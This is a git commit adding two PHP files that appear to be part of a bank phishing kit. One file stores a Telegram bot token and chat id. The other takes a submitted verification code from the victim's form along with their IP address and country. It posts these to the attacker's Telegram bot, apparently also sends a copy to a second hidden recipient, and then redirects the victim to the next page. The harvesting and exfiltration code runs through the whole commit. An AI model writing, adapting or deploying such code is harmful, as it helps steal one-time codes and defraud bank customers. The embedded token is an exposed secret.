1cb55c1d2d550956739f770d8ff03e90fa21f2a0
wqeqweq1113 <austingonzalez767@gmail.com>
2024-05-02 14:54:06 -0400

    Add files via upload

---
+++ js/infotelegram.php
@@ -0,0 +1,6 @@
+<?php
+
+$token = "7112614350:AAFd-HpKEBg8-VGKyH4080BidYEA9NAhBqY";
+$tid = "-4260373497";
+
+?>
---
+++ js/sax3.php
@@ -0,0 +1,47 @@
+
+
+<?php
+include "infotelegram.php";
+
+$userp = $_SERVER['REMOTE_ADDR'];
+$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
+
+
+function env($token, $chatId, $mensaje) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = array(
+        'chat_id' => $chatId,
+        'text' => $mensaje
+    );
+
+    $options = array(
+        'http' => array(
+            'method'  => 'POST',
+            'header'  => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($data)
+        )
+    );
+
+    $context = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $mensaje = "🥶0CA-BLU3🥶\n📞COD: ".$_POST['t3l3x']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".$cc."\n🥶C0DIGO SYN4PSE🥶";
+    if (empty($mensaje)) {
+        die("Error: El campo de mensaje no puede estar vacío.");
+    }
+
+    $tokenBot = $token;
+    $chatIDBot = $tid;
+
+    $navegador = $google;
+    $mobile = $edge;
+
+    env($tokenBot, $chatIDBot, $mensaje);
+    env($navegador, $mobile, $mensaje);
+    echo "<script>window.location.href = \"../load2.php\"</script>";
+}
+?>
+
